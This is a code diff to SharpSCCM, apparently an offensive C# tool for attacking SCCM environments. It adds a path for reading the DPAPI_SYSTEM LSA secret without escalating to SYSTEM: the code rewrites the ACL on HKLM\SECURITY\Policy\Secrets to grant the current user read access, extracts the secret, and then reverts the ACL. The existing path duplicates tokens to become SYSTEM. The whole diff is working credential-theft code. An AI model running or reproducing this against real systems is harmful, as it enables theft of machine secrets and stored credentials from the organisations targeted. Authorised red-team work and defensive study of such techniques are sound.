@@ -10,6 +10,10 @@ using System.Text.RegularExpressions;
 using System.Text;
 using System.Security.Cryptography;
 using System.Collections;
+using Microsoft.Win32;
+using System.Security.AccessControl;
+using System.Data;
+using System.Runtime.InteropServices.ComTypes;
 
 namespace SharpSCCM
 {
@@ -43,7 +47,7 @@ namespace SharpSCCM
             return dpapiKeys;
         }
 
-        public static byte[] GetLSASecret(string secretName)
+        public static byte[] GetLSASecret(string secretName, bool reg = false)
         {
             // elevates to SYSTEM, retrieves the LSA decryption key (GetLSAKey()),
             //  and uses that to decrypt the given "secretName" LSA secret
@@ -51,6 +55,11 @@ namespace SharpSCCM
             // NOTE: right now only the "DPAPI_SYSTEM" LSA secret is implemented, but others would be trivial
 
             bool alreadySystem = false;
+            bool regPermissionsModified = false;
+            RegistrySecurity originalAcl = new RegistrySecurity();
+            RegistrySecurity newAcl = new RegistrySecurity();
+            RegistryAccessRule newRule;
+            RegistrySecurity revertedAcl;
 
             if (!Helpers.IsHighIntegrity())
             {
@@ -60,15 +69,33 @@ namespace SharpSCCM
             else
             {
                 string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+
+                // Check if we're already system
                 if (currentName == "NT AUTHORITY\\SYSTEM")
                 {
                     alreadySystem = true;
                 }
-                else
+
+                // If we're not system and we want to escalate
+                else if ((reg == false) && (alreadySystem == false))
                 {
                     // elevated but not system, so gotta GetSystem() first
                     Console.WriteLine("[*] Elevating to SYSTEM via token duplication for LSA secret retrieval");
                     Helpers.GetSystem();
+                }
+
+                // If we're not system and we don't want to escalate, modify the LSA secrets reg key permissions instead
+                else if ((reg == true) && (alreadySystem == false))
+                {
+                    Console.WriteLine("[*] Modifying permissions on registry key: HKLM:\\SECURITY\\Policy\\Secrets");
+
+                    originalAcl = Registry.LocalMachine.OpenSubKey("SECURITY\\Policy\\Secrets\\", RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ReadPermissions).GetAccessControl();
+                    newAcl = originalAcl;
+                    newRule = new RegistryAccessRule(currentName, RegistryRights.ReadKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow);
+                    newAcl.AddAccessRule(newRule);
+                    Registry.LocalMachine.OpenSubKey("SECURITY\\Policy\\Secrets\\", RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ChangePermissions).SetAccessControl(newAcl);
+                    regPermissionsModified = true;
+
                 }
             }
 
@@ -109,6 +136,13 @@ namespace SharpSCCM
             {
                 Console.WriteLine("[X] LSA Secret '{0}' not yet implemented!", secretName);
                 return null;
+            }
+
+            if (reg)
+            {
+                revertedAcl = newAcl;
+                revertedAcl.RemoveAccessRule(newRule);
+                Registry.LocalMachine.OpenSubKey("SECURITY\\Policy\\Secrets\\", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions).SetAccessControl(revertedAcl);
             }
         }
 
